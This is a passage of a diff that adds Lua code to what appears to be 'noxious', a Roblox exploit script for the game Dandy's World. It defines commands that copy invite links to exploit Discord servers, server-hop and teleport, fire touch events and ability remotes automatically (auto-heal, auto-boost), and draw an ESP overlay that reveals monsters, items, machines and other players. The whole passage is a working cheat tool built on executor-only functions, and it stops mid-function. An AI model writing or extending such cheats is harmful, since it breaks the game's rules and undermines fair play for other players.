+	if #noxious["command lists"]["Favorited Commands"] == 0 then
+		notify("No favorited commands to execute.", 5, "error")
+		return
+	end
+
+	for _, pinnedCommand in ipairs(noxious["command lists"]["Favorited Commands"]) do
+		task.spawn(function()
+			local mainCommand = pinnedCommand:match("^(.-),") or pinnedCommand:match("^(.-)%s*%-") or pinnedCommand
+
+			execcmd(mainCommand)
+		end)
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("commandbar", "cmdbar", function()
+	makecmdbar()
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("dandybindiscord", "dbdiscord", function()
+	local everyClipboard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
+
+	function copytoclipboard(txt)
+		if everyClipboard then
+			everyClipboard(tostring(txt))
+			notify("Copied to clipboard.", 5)
+		else
+			notify("Unable to access clipboard.", 5, "error")
+		end
+	end
+	copytoclipboard"https://discord.com/invite/dandysworldexploits"	
+end)
+
+addcommand("hexdiscord", "hdiscord", function()
+	local everyClipboard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
+
+	function copytoclipboard(txt)
+		if everyClipboard then
+			everyClipboard(tostring(txt))
+			notify("Copied to clipboard.", 5)
+		else
+			notify("Unable to access clipboard.", 5, "error")
+		end
+	end
+	copytoclipboard"https://discord.gg/QnkQ9q4P"	
+end)
+
+addcommand("blushcrunchdiscord", "bcdiscord", function()
+	local everyClipboard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
+
+	function copytoclipboard(txt)
+		if everyClipboard then
+			everyClipboard(tostring(txt))
+			notify("Copied to clipboard.", 5)
+		else
+			notify("Unable to access clipboard.", 5, "error")
+		end
+	end
+	copytoclipboard"https://discord.gg/blushcrunch"	
+end)
+
+addcommand("noxiousdiscord", "nxsdiscord", function()
+	local everyClipboard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
+
+	function copytoclipboard(txt)
+		if everyClipboard then
+			everyClipboard(tostring(txt))
+			notify("Copied to clipboard.", 5)
+		else
+			notify("Unable to access clipboard.", 5, "error")
+		end
+	end
+	copytoclipboard("https://discord.gg/bwdk8vAy8n")
+end)
+
+addcommand("gobbydiscord", "gbydiscord", function()
+	local everyClipboard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
+
+	function copytoclipboard(txt)
+		if everyClipboard then
+			everyClipboard(tostring(txt))
+			notify("Copied to clipboard.", 5)
+		else
+			notify("Unable to access clipboard.", 5, "error")
+		end
+	end
+	copytoclipboard"https://discord.gg/acwaBYnSJM"	
+end)
+
+addcommand("scarletdiscord", "bookclub", function()
+	local everyClipboard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
+
+	function copytoclipboard(txt)
+		if everyClipboard then
+			everyClipboard(tostring(txt))
+			notify("Copied to clipboard.", 5)
+		else
+			notify("Unable to access clipboard.", 5, "error")
+		end
+	end
+	copytoclipboard"https://discord.gg/hbHEv8QvE9"	
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("notify", "n", function(...)
+	local text = table.concat({...}, " ")
+	if text ~= "" then
+		notify(text, 5)
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("notifyversion", "notifyver", function()
+	notify("The current version is: " .. noxious["version"], 5)
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("closeallnotifications", "can", function()
+	closeallnotifs()
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("serverhop", "shop", function()
+	local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+	if httprequest then
+		local servers = {}
+		local req = httprequest({Url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true", game.PlaceId)})
+		local body = noxious["http service"]:JSONDecode(req.Body)
+
+		if body and body.data then
+			for i, v in next, body.data do
+				if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= game.JobId then
+					table.insert(servers, 1, v.id)
+				end
+			end
+		end
+
+		if #servers > 0 then
+			noxious["teleport service"]:TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], noxious["players"].LocalPlayer)
+		else
+			return notify("Couldnt find a server.", 5, "error")
+		end
+	else
+		notify("Your executor does not support this command.", 5, "error")
+	end
+end)
+
+addcommand("smallserverhop", "sshop", function()
+	local Number=math.huge
+	local SomeSRVS={}
+	local found=0
+
+	for _,v in ipairs(noxious["http service"]:JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100")).data) do
+		if type(v)=="table" and v.maxPlayers>v.playing and v.id~=game.JobId then
+			if v.playing<Number then
+				Number=v.playing
+				SomeSRVS[1]=v.id
+				found=v.playing
+			end
+		end
+	end
+
+	if #SomeSRVS>0 then
+		noxious["teleport service"]:TeleportToPlaceInstance(game.PlaceId,SomeSRVS[1])
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("joinlobby", "jl", function()
+	noxious["teleport service"]:Teleport(noxious["dandy's world lobby"], noxious["local player"])
+end)
+
+addcommand("joinroleplayserver", "jrps", function()
+	noxious["teleport service"]:Teleport(noxious["dandy's world roleplay server"], noxious["local player"])
+end)
+
+addcommand("joinrun", "jr", function()
+	noxious["teleport service"]:Teleport(noxious["dandy's world run"], noxious["local player"])
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("rerun", "rrun", function()
+	task.spawn(function()
+		noxious["qtp"]([[local Players = game:GetService("Players")
+	local player = Players.LocalPlayer
+
+	local function findgate()
+		for _, model in ipairs(workspace["Elevators"]:GetChildren()) do
+			if model:IsA("Model") and model.Name == "Gate" then
+				local gate = model:FindFirstChild("Gate")
+				local partOne = model:FindFirstChild("1")
+				if gate and gate:IsA("BasePart") and partOne and partOne:IsA("BasePart") then
+					return gate
+				end
+			end
+		end
+		return nil
+	end
+
+	local function gog(lal)
+		local character = player.Character or player.CharacterAdded:Wait()
+		local root = character:WaitForChild("HumanoidRootPart")
+
+		local savedCFrame = root.CFrame
+
+		firetouchinterest(root, lal, 0)
+		task.wait(0.1)
+		firetouchinterest(root, lal, 1)
+
+		root.Anchored = true
+		task.wait(0.1)
+		root.CFrame = savedCFrame
+		task.wait(0.1)
+		root.Anchored = false
+	end
+
+	local function waitForFullCharacter()
+		local character = player.Character or player.CharacterAdded:Wait()
+		repeat
+			task.wait()
+		until character:FindFirstChild("HumanoidRootPart") and character:FindFirstChild("Humanoid")
+		return character
+	end
+
+	task.spawn(function()
+		waitForFullCharacter()
+		local gate = findgate()
+		if gate then
+			gog(gate)
+		end
+	end)]])
+	end)
+	task.wait(0.5)
+	noxious["teleport service"]:Teleport(noxious["dandy's world lobby"], noxious["local player"])
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+healnearbyloopenabled = false
+healnearbyconnection = nil
+
+function enablehealnearby()
+	if healnearbyloopenabled then return end
+	healnearbyloopenabled = true
+
+	local Players = game:GetService("Players")
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local LocalPlayer = Players.LocalPlayer
+	local AbilityEvent = ReplicatedStorage:WaitForChild("Events"):WaitForChild("AbilityEvent")
+
+	local lastTarget = nil
+
+	local function getClosestOneHealthPlayer()
+		local closestPlayer = nil
+		local closestDistance = math.huge
+
+		local myChar = LocalPlayer.Character
+		if not myChar or not myChar:FindFirstChild("HumanoidRootPart") then return nil end
+		local myPos = myChar.HumanoidRootPart.Position
+
+		for _, player in pairs(Players:GetPlayers()) do
+			if player ~= LocalPlayer then
+				local char = player.Character
+				if char and char:FindFirstChild("Humanoid") and char.Humanoid.Health == 1 and char:FindFirstChild("HumanoidRootPart") then
+					local distance = (char.HumanoidRootPart.Position - myPos).Magnitude
+					if distance < closestDistance then
+						closestDistance = distance
+						closestPlayer = player
+					end
+				end
+			end
+		end
+
+		return closestPlayer
+	end
+
+	healnearbyconnection = task.spawn(function()
+		while healnearbyloopenabled do
+			local closest = getClosestOneHealthPlayer()
+
+			if closest and closest ~= lastTarget then
+				lastTarget = closest
+			end
+
+			if lastTarget and lastTarget.Character and lastTarget.Character:FindFirstChild("Humanoid") then
+				if lastTarget.Character.Humanoid.Health == 1 then
+					local myChar = LocalPlayer.Character
+					local targetChar = lastTarget.Character
+					if myChar and targetChar then
+						local args = {
+							myChar,
+							CFrame.new(21.400053024291992, 146.07144165039062, -0.820641815662384, -0.883121907711029, -2.6923208551465905e-08, 0.4691435396671295, -2.2795578757950352e-08, 1, 1.4477303800219943e-08, -0.4691435396671295, 2.0908255127238817e-09, -0.883121907711029),
+							targetChar
+						}
+						AbilityEvent:InvokeServer(unpack(args))
+					end
+				else
+					lastTarget = nil
+				end
+			end
+
+			task.wait(0.5)
+		end
+	end)
+end
+
+addcommand("enablesprouthealnearby", "eshn", function()
+	if not checktoon("Sprout") then return end
+	enablehealnearby()
+end)
+
+addcommand("disablesprouthealnearby", "dshn", function()
+	if not checktoon("Sprout") then return end
+	healnearbyloopenabled = false
+end)
+
+addcommand("enablecosmohealnearby", "echn", function()
+	if not checktoon("Cosmo") then return end
+	enablehealnearby()
+end)
+
+addcommand("disablecosmohealnearby", "dchn", function()
+	if not checktoon("Cosmo") then return end
+	healnearbyloopenabled = false
+end)
+
+---------------------------------------------------------------------------------------------------------------------------
+
+autoboostenabled = false
+autoboostconnection = nil
+
+function enableautoboost()
+	if autoboostenabled then return end
+	autoboostenabled = true
+
+	local Players = game:GetService("Players")
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local LocalPlayer = Players.LocalPlayer
+	local AbilityEvent = ReplicatedStorage:WaitForChild("Events"):WaitForChild("AbilityEvent")
+
+	local lastTarget = nil
+
+	local function getClosestDecodingPlayer()
+		local closestPlayer = nil
+		local closestDistance = math.huge
+
+		local myChar = LocalPlayer.Character
+		if not myChar or not myChar:FindFirstChild("HumanoidRootPart") then return nil end
+		local myPos = myChar.HumanoidRootPart.Position
+
+		for _, player in pairs(Players:GetPlayers()) do
+			if player ~= LocalPlayer then
+				local char = player.Character
+				if char and char:FindFirstChild("HumanoidRootPart") and char:FindFirstChild("Decoding") then
+					if char.Decoding.Value ~= nil then
+						local distance = (char.HumanoidRootPart.Position - myPos).Magnitude
+						if distance < closestDistance then
+							closestDistance = distance
+							closestPlayer = player
+						end
+					end
+				end
+			end
+		end
+
+		return closestPlayer
+	end
+
+	autoboostconnection = task.spawn(function()
+		while autoboostenabled do
+			local closest = getClosestDecodingPlayer()
+
+			if closest and closest ~= lastTarget then
+				lastTarget = closest
+			end
+
+			if lastTarget and lastTarget.Character and lastTarget.Character:FindFirstChild("Decoding") then
+				if lastTarget.Character.Decoding.Value ~= nil then
+					local myChar = LocalPlayer.Character
+					local targetChar = lastTarget.Character
+					if myChar and targetChar then
+						local args = {
+							myChar,
+							CFrame.new(21.400053024291992, 146.07144165039062, -0.820641815662384, -0.883121907711029, -2.6923208551465905e-08, 0.4691435396671295, -2.2795578757950352e-08, 1, 1.4477303800219943e-08, -0.4691435396671295, 2.0908255127238817e-09, -0.883121907711029),
+							targetChar
+						}
+						AbilityEvent:InvokeServer(unpack(args))
+					end
+				else
+					lastTarget = nil
+				end
+			end
+
+			task.wait(0.5)
+		end
+	end)
+end
+
+addcommand("enableshellyautoboost", "esab", function()
+	if not checktoon("Shelly") then return end
+	enableautoboost()
+end)
+
+addcommand("disableautoshellyboost", "dsab", function()
+	if not checktoon("Shelly") then return end
+	autoboostenabled = false
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+esptextvisible = true
+espvisualsvisible = true
+esplooprunning = false
+
+function createAdornment(parent, color)
+	if legacyhighlights then
+		local adornment = Instance.new("BoxHandleAdornment")
+		adornment.Name = "EspAdornment"
+		adornment.Adornee = parent
+		adornment.AlwaysOnTop = true
+		adornment.ZIndex = 10 
+		adornment.Size = parent:GetExtentsSize()
+		adornment.Color3 = color
+		adornment.Transparency = 0.5
+		adornment.Visible = espvisualsvisible
+		adornment.Parent = parent
+		return adornment
+	else
+		local highlight = Instance.new("Highlight")
+		highlight.Name = "EspHighlight"
+		highlight.FillColor = color
+		highlight.OutlineColor = Color3.new(1, 1, 1)
+		highlight.Enabled = espvisualsvisible
+		highlight.Parent = parent
+		return highlight
+	end
+end
+
+function makeespbillboard(parent, modelName, textColor, generatorStats)
+	local billboard = Instance.new("BillboardGui")        
+	billboard.Name = "EspBillboardGUIName"
+	billboard.Adornee = parent
+	billboard.Size = UDim2.new(0, 100, 0, 50)
+	billboard.AlwaysOnTop = true
+	billboard.Parent = parent
+
+	local label = Instance.new("TextLabel")        
+	label.Size = UDim2.new(1, 0, 1, 0)
+	label.BackgroundTransparency = 1
+	label.Text = modelName
+	label.Font = Enum.Font.Nunito
+	label.ZIndex = 11
+	label.TextColor3 = textColor
+	label.TextStrokeTransparency = 0.5
+	label.TextStrokeColor3 = Color3.new(1, 1, 1)
+	label.TextSize = 21.6
+	label.Visible = esptextvisible
+	label.Parent = billboard
+
+	if generatorStats then
+		local currentAmount = generatorStats.CurrentAmount or 0
+		local requiredAmount = generatorStats.RequiredAmount or 0
+		label.Text = modelName .. "\n(" .. currentAmount .. " / " .. requiredAmount .. ")"
+	end
+
+	return billboard, label
+end
+
+function toggleespbillboardvisibility(visible)
+	esptextvisible = visible
+
+	for _, descendant in pairs(workspace:GetDescendants()) do
+		if descendant:IsA("BillboardGui") and descendant.Name == "EspBillboardGUIName" then
+			local label = descendant:FindFirstChildOfClass("TextLabel")            
+			if label then
+				label.Visible = visible
+			end
+		end
+	end
+end
+
+function toggleesphighlightvisibility(visible)
+	espvisualsvisible = visible
+
+	if legacyhighlights then
+		for _, descendant in pairs(workspace:GetDescendants()) do
+			if descendant:IsA("BoxHandleAdornment") and descendant.Name == "EspAdornment" then
+				descendant.Visible = visible
+			end
+		end
+	else
+		for _, descendant in pairs(workspace:GetDescendants()) do
+			if descendant:IsA("Highlight") and descendant.Name == "EspHighlight" then
+				descendant.Enabled = visible
+			end
+		end
+	end
+end
+
+function tweentoblack(target)
+	local visual
+	if legacyhighlights then
+		visual = target:FindFirstChild("EspAdornment")
+	else
+		visual = target:FindFirstChild("EspHighlight")
+	end
+
+	local billboard = target:FindFirstChild("EspBillboardGUIName")
+	local textLabel = billboard and billboard:FindFirstChildOfClass("TextLabel")
+
+	if visual then
+		local tweenInfo = TweenInfo.new(
+			1,
+			Enum.EasingStyle.Linear,
+			Enum.EasingDirection.InOut,
+			-1,
+			true
+		)
+
+		-- Tween the visual element
+		if legacyhighlights then
+			local adornmentTween = noxious["tween service"]:Create(
+				visual,
+				tweenInfo,
+				{ Color3 = Color3.new(0, 0, 0) }
+			)
+			adornmentTween:Play()
+		else
+			local highlightTween = noxious["tween service"]:Create(
+				visual,
+				tweenInfo,
+				{ FillColor = Color3.new(0, 0, 0) }
+			)
+			highlightTween:Play()
+		end
+
+		-- Always tween the text label if it exists
+		if textLabel then
+			local textTween = noxious["tween service"]:Create(
+				textLabel,
+				tweenInfo,
+				{ TextColor3 = Color3.new(0, 0, 0) }
+			)
+			textTween:Play()
+		end
+	end
+end
+
+function eventesptween(monster)
+	local visual
+	if legacyhighlights then
+		visual = monster:FindFirstChild("EspAdornment")
+	else
+		visual = monster:FindFirstChild("EspHighlight")
+	end
+
+	local billboard = monster:FindFirstChild("EspBillboardGUIName")        
+	local textLabel = billboard and billboard:FindFirstChildOfClass("TextLabel")
+
+	if visual then
+		if legacyhighlights then
+			visual.Color3 = Color3.fromRGB(140, 255, 140)
+		else
+			visual.FillColor = Color3.fromRGB(140, 255, 140)
+		end
+
+		local tweenInfo = TweenInfo.new(
+			1,
+			Enum.EasingStyle.Linear,
+			Enum.EasingDirection.InOut,
+			-1,
+			true
+		)
+
+		if legacyhighlights then
+			local adornmentTween = noxious["tween service"]:Create(
+				visual,
+				tweenInfo,
+				{ Color3 = Color3.fromRGB(237, 121, 210) }
+			)
+			adornmentTween:Play()
+		else
+			local highlightTween = noxious["tween service"]:Create(
+				visual,
+				tweenInfo,
+				{ FillColor = Color3.fromRGB(237, 121, 210) }
+			)
+			highlightTween:Play()
+		end
+
+		if textLabel then
+			textLabel.TextColor3 = Color3.fromRGB(140, 255, 140)
+
+			local textTween = noxious["tween service"]:Create(
+				textLabel,
+				tweenInfo,
+				{ TextColor3 = Color3.fromRGB(237, 121, 210) }
+			)
+			textTween:Play()
+		end
+	end
+end
+
+function specialitemtween(item)
+	local visual
+	if legacyhighlights then
+		visual = item:FindFirstChild("EspAdornment")
+	else
+		visual = item:FindFirstChild("EspHighlight")
+	end
+
+	local billboard = item:FindFirstChild("EspBillboardGUIName")
+	local textLabel = billboard and billboard:FindFirstChildOfClass("TextLabel")
+
+	if visual then
+		local tweenInfo = TweenInfo.new(
+			1,
+			Enum.EasingStyle.Linear,
+			Enum.EasingDirection.InOut,
+			-1,
+			true
+		)
+
+		local targetColor = Color3.fromRGB(237, 121, 210)
+
+		if legacyhighlights then
+			local adornmentTween = noxious["tween service"]:Create(
+				visual,
+				tweenInfo,
+				{ Color3 = targetColor }
+			)
+			adornmentTween:Play()
+		else
+			local highlightTween = noxious["tween service"]:Create(
+				visual,
+				tweenInfo,
+				{ FillColor = targetColor }
+			)
+			highlightTween:Play()
+		end
+
+		if textLabel then
+			local textTween = noxious["tween service"]:Create(
+				textLabel,
+				tweenInfo,
+				{ TextColor3 = targetColor }
+			)
+			textTween:Play()
+		end
+	end
+end
+
+function addesp()
+	local currentRoom = workspace:FindFirstChild("CurrentRoom")
+
+	if noxious["esp types"].Monsters and currentRoom then
+		for _, model in pairs(currentRoom:GetChildren()) do
+			local monstersFolder = model:FindFirstChild("Monsters")
+			if monstersFolder then
+				for _, monster in pairs(monstersFolder:GetChildren()) do
+					if monster:IsA("Model") and not (legacyhighlights and monster:FindFirstChild("EspAdornment")) and not (not legacyhighlights and monster:FindFirstChild("EspHighlight")) then
+						local rawName = monster.Name
+						local baseName
+
+						if rawName == "RazzleDazzleMonster" then
+							baseName = cleareresptext and "T. R&D" or "Twisted Razzle & Dazzle"
+						elseif rawName == "BlottMonster" or rawName == "BlotMonster" then
+							baseName = cleareresptext and "T. Blot" or "Twisted Blot"
+						else
+							baseName = rawName:gsub("Monster", ""):match("^%s*(.-)%s*$")
+							baseName = cleareresptext and ("T. " .. baseName) or ("Twisted " .. baseName)
+						end
+
+						local visual = createAdornment(monster, getespcolor("twisteds"))
+
+						local trackedNames = {
+							["GoobMonster"] = true,
+							["GigiMonster"] = true,
+							["ScrapsMonster"] = true,
+							["Twisted Goob"] = true,
+							["Twisted Gigi"] = true,
+							["Twisted Scraps"] = true,
+						}
+
+						local showTimer = trackedNames[rawName] == true
+						local initialText = showTimer and (baseName .. "\n(0)") or baseName
+						local billboard, label = makeespbillboard(monster, initialText, getespcolor("twisteds"))
+
+						if showTimer then
+							local grabbing = monster:FindFirstChild("Grabbing")
+							if grabbing and grabbing:IsA("BoolValue") then
+								local timerThread = nil
+
+								grabbing.Changed:Connect(function(newVal)
+									if newVal then return end
+									if timerThread then return end
+
+									timerThread = task.spawn(function()
+										for i = 11, 0, -1 do
+											if label then
+												label.Text = baseName .. "\n(" .. i .. ")"
+											end
+											task.wait(1)
+										end
+										if label then
+											label.Text = baseName .. "\n(0)"
+										end
+										timerThread = nil
+									end)
+								end)
+							end
+						end
+
+						if table.find({"AstroMonster", "VeeMonster", "SproutMonster", "PebbleMonster", "ShellyMonster", "DandyMonster"}, rawName) then
+							tweentoblack(monster)
+						elseif table.find({"BassieMonster", "EggsonMonster", "FlyteMonster", "CocoaMonster", "ShellyMonster", "DandyMonster"}, rawName) then
+							if legacyhighlights then
+								visual.Color3 = Color3.fromRGB(140, 255, 140)
+							else
+								visual.FillColor = Color3.fromRGB(140, 255, 140)
+							end
+							eventesptween(monster)
+						end
+					end
+				end
+			end
+		end
+	end
+
+	if noxious["esp types"].Tendrils and currentRoom then
+		for _, model in pairs(currentRoom:GetChildren()) do
+			local freeArea = model:FindFirstChild("FreeArea")
+			if freeArea then
+				for _, child in pairs(freeArea:GetChildren()) do
+					if child.Name == "SproutTendril" and child:IsA("Model") and not (legacyhighlights and child:FindFirstChild("EspAdornment")) and not (not legacyhighlights and child:FindFirstChild("EspHighlight")) then
+						local visual = createAdornment(child, getespcolor("tendrils"))
+
+						local displayText = "Sprout's Tendril"
+						if cleareresptext then displayText = "Tendril" end
+						makeespbillboard(child, displayText, getespcolor("tendrils"))
+					end
+				end
+			end
+		end
+	end
+
+	if noxious["esp types"].BlotHands and currentRoom then
+		for _, model in pairs(currentRoom:GetChildren()) do
+			local freeArea = model:FindFirstChild("FreeArea")
+			if freeArea then
+				for _, child in pairs(model:GetChildren()) do
+					if (child.Name == "BlotHand" or child.Name == "BlotHandZone_1" or child.Name == "BlotHandZone_2")
+						and not (legacyhighlights and child:FindFirstChild("EspAdornment")) and not (not legacyhighlights and child:FindFirstChild("EspHighlight"))
+					then
+						local target = nil
+
+						if child:IsA("Model") then
+							local primaryPart = child.PrimaryPart or child:FindFirstChildWhichIsA("BasePart")
+							if primaryPart then
+								target = child
+							end
+						end
+
+						if not target and child:IsA("BasePart") then
+							target = child
+						end
+
+						if target then
+							local visual = createAdornment(target, getespcolor("blotshands"))
+
+							local displayText = "Blot's Hand"
+							if cleareresptext then displayText = "Hand" end
+							makeespbillboard(target, displayText, getespcolor("blotshands"))
+						end
+					end
+				end
+			end
+		end
+	end
+
+	if noxious["esp types"].FakeElevator then
+		if currentRoom then
+			for _, model in pairs(currentRoom:GetChildren()) do
+				local freeArea = model:FindFirstChild("FreeArea")
+				if freeArea then
+					local fakeElevatorModel = freeArea:FindFirstChild("FakeElevator")
+					if fakeElevatorModel then
+						local fakeElevator = fakeElevatorModel:FindFirstChild("ElevatorDoor")
+						if fakeElevator and fakeElevator:IsA("Model") and not (legacyhighlights and fakeElevator:FindFirstChild("EspAdornment")) and not (not legacyhighlights and fakeElevator:FindFirstChild("EspHighlight")) then
+							local visual = createAdornment(fakeElevator, getespcolor("fakeelevator"))
+
+							local displayText = cleareresptext and "F. Ele" or "Fake Elevator"
+							makeespbillboard(fakeElevator, displayText, getespcolor("fakeelevator"))
+							tweentoblack(fakeElevator)
+						end
+					end
+				end
+			end
+		end
+	end
+
+	if noxious["esp types"].Elevator then
+		local elevatorsFolder = workspace:FindFirstChild("Elevators")
+		if elevatorsFolder then
+			local elevatorModel = elevatorsFolder:FindFirstChild("Elevator")
+			if elevatorModel then
+				local elevator = elevatorModel:FindFirstChild("ElevatorDoor")
+				if elevator and elevator:IsA("Model") and not (legacyhighlights and elevator:FindFirstChild("EspAdornment")) and not (not legacyhighlights and elevator:FindFirstChild("EspHighlight")) then
+					local visual = createAdornment(elevator, getespcolor("elevator"))
+
+					local displayText = cleareresptext and "Ele" or "Elevator"
+					makeespbillboard(elevator, displayText, getespcolor("elevator"))
+					tweentoblack(elevator)
+				end
+			end
+		end
+	end
+
+	if noxious["esp types"].Items and currentRoom then
+		for _, model in pairs(currentRoom:GetChildren()) do
+			local itemsFolder = model:FindFirstChild("Items")
+			if itemsFolder then
+				for _, item in pairs(itemsFolder:GetChildren()) do
+					if item:IsA("Model") and not (legacyhighlights and item:FindFirstChild("EspAdornment")) and not (not legacyhighlights and item:FindFirstChild("EspHighlight")) then
+						local displayText = item.Name
+						local formattedText = ""
+
+						if item.Name == "ResearchCapsule" then
+							local function fetchMonsterName()
+								local prompt = item:FindFirstChild("Prompt")
+								if prompt then
+									local monsterString = prompt:FindFirstChild("Monster")
+									if monsterString and monsterString:IsA("StringValue") then
+										local monsterName = monsterString.Value
+										if monsterName == "RazzleDazzleMonster" then
+											if cleareresptext then 
+												monsterName = "R&D"
+											else 
+												monsterName = "Razzle & Dazzle"
+											end
+										end
+
+										monsterName = monsterName:gsub("Monster", "")
+										monsterName = monsterName:match("^%s*(.-)%s*$")
+
+										if cleareresptext then
+											return "T. " .. monsterName
+										else
+											return "Twisted " .. monsterName
+										end
+									end
+								end
+								return nil
+							end
+
+							local monsterName = fetchMonsterName()
+							if not monsterName then
+								task.delay(0.1, function()
+									monsterName = fetchMonsterName()
+									if monsterName then
+										displayText = cleareresptext and "Capsule" or "Research Capsule (" .. monsterName .. ")"
+										if item:FindFirstChild("EspBillboardGUIName") then
+											local billboard = item.EspBillboardGUIName:FindFirstChildOfClass("TextLabel")
+											if billboard then
+												billboard.Text = displayText
+											end
+										end
+									end
+								end)
+							else
+								displayText = cleareresptext and "Capsule" or "Research Capsule (" .. monsterName .. ")"
+							end
+						end
+
+						for i = 1, #item.Name do
+							local char = item.Name:sub(i, i)
+							if char:match("%u") and i > 1 then
+								formattedText = formattedText .. " " .. char
+							else
+								formattedText = formattedText .. char
+							end
+						end
+
+						if item.Name ~= "ResearchCapsule" then
+							displayText = formattedText
+						end
+
+						if item.Name == "RazzleDazzle" then
+							displayText = cleareresptext and "R&D" or "Razzle & Dazzle"
+						elseif item.Name == "HolidayCollectibleItem" or item.Name == "Holiday Collectible Item" then
+							displayText = "Basket"
+						end
+
+						local espColor = getespcolor("items") -- default color
+						local shouldTween = false
+						local shouldTween2 = false
+
+						-- Determine displayText & color override
+						if item.Name == "FakeCapsule" then
+							espColor = getespcolor("fakecapsules")
+						elseif table.find({ "JumperCable", "Bandage", "AirHorn", "Jawbreaker", "BonBon", "ExtractionSpeedCandy" }, item.Name) then
+							espColor = getespcolor("rareitems")
+						elseif table.find({ "PopBottle", "HealthKit", "ChocolateBox", "EjectButton", "SmokeBomb" }, item.Name) then
+							espColor = getespcolor("superrareitems")
+						elseif table.find({ "HolidayCollectibleItem", "Holiday Collectible Item", "Basket" }, item.Name) then
+							espColor = Color3.fromRGB(140, 255, 140)
+							shouldTween = true
+						elseif table.find({
+							"Research Capsule (Twisted Eggson)",
+							"Research Capsule (Twisted Cocoa)",
+							"Research Capsule (Twisted Bassie)",
+							"Research Capsule (Twisted Flyte)",
+							}, displayText) then
+							espColor = Color3.fromRGB(140, 255, 140)
+							shouldTween = true
+						elseif table.find({
+							"Research Capsule (Twisted Dandy)",
+							"Research Capsule (Twisted Vee)",
+							"Research Capsule (Twisted Sprout)",
+							"Research Capsule (Twisted Astro)",
+							"Research Capsule (Twisted Pebble)",
+							"Research Capsule (Twisted Shelly)",
+							}, displayText) then
+							shouldTween2 = true
+						end
+
+						-- Create visual and billboard once
+						local visual = createAdornment(item, espColor)
+						local billboard, label = makeespbillboard(item, displayText, espColor)
+
+						-- Apply special tween effects
+						if shouldTween then
+							task.spawn(function()
+								specialitemtween(item)
+							end)
+						elseif shouldTween2 then
+							task.spawn(function()
+								task.wait(0)
+								tweentoblack(item)
+							end)
+						end
+					end
+				end
+			end
+		end
+	end
+
+	if noxious["esp types"].Players then
+		for _, player in pairs(noxious["players"]:GetPlayers()) do
+			if player ~= noxious["local player"] and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+				local visual
+				if legacyhighlights then
+					visual = player.Character:FindFirstChild("EspAdornment")
+				else
+					visual = player.Character:FindFirstChild("EspHighlight")
+				end
+
+				if not visual then
+					visual = createAdornment(player.Character, getespcolor("players"))
+
+					local billboardText
+					if cleareresptext == true then
+						billboardText = player.DisplayName
+					else
+						billboardText = "(@" .. player.Name .. ")\n" .. player.DisplayName
+					end
+
+					makeespbillboard(player.Character, billboardText, getespcolor("players"))
+				end
+			end
+		end
+	end
+
+	local function round(num)
+		return math.floor(num + 0.5)
+	end
+
+	if noxious["esp types"].Machines and currentRoom then
+		for _, model in pairs(currentRoom:GetChildren()) do
+			local generatorsFolder = model:FindFirstChild("Generators")                
+			if generatorsFolder then
+				for _, generator in pairs(generatorsFolder:GetChildren()) do
+					if generator:IsA("Model") and not (legacyhighlights and generator:FindFirstChild("EspAdornment")) and not (not legacyhighlights and generator:FindFirstChild("EspHighlight")) then
+						local textColor = getespcolor("machines")
+						local fillColor = getespcolor("machines")
+						local statsFolder = generator:FindFirstChild("Stats")                            
+						local completed = statsFolder and statsFolder:FindFirstChild("Completed")                            
+						local currentAmount = statsFolder and statsFolder:FindFirstChild("CurrentAmount")                            
+						local requiredAmount = statsFolder and statsFolder:FindFirstChild("RequiredAmount")  
+						local playeractive = statsFolder and statsFolder:FindFirstChild("ActivePlayer")
+						local connie = statsFolder and statsFolder:FindFirstChild("Connie")
+
+						local visual = createAdornment(generator, fillColor)
+
+						local function updateGeneratorAppearance()
+							if connie and connie.Value == true then
+								fillColor = getespcolor("posessedmachines")
+								textColor = getespcolor("posessedmachines")
+							elseif completed and completed.Value == true then
+								fillColor = getespcolor("completedmachines")
+								textColor = getespcolor("completedmachines")
+							elseif playeractive and playeractive.Value ~= nil then
+								fillColor = getespcolor("machinesbeingextracted")
+								textColor = getespcolor("machinesbeingextracted")
+							else
+								fillColor = getespcolor("machines")
+								textColor = getespcolor("machines")
+							end
+
+							if legacyhighlights then
+								visual.Color3 = fillColor
+							else
+								visual.FillColor = fillColor
+							end
+
+							local billboard = generator:FindFirstChild("EspBillboardGUIName")                                
+							if billboard then
+								local label = billboard:FindFirstChildOfClass("TextLabel")                                    
+								if label then
+									label.TextColor3 = textColor
+									local generatorName = generator.Name
+									if connie and connie.Value == true then
+										if not cleareresptext then generatorName = generatorName .. " (Possessed)" else
+											generatorName = generatorName .. " (P)"
+										end
+									end
+									if completed and completed.Value == true then
+										if not cleareresptext then generatorName = generatorName .. " (Completed)" else
+											generatorName = generatorName .. " (C)"
+										end
+									end
+									if playeractive and playeractive.Value ~= nil then
+										if not cleareresptext then generatorName = generatorName .. " (Extracting)" else
+											generatorName = generatorName .. " (E)"
+										end
+									end
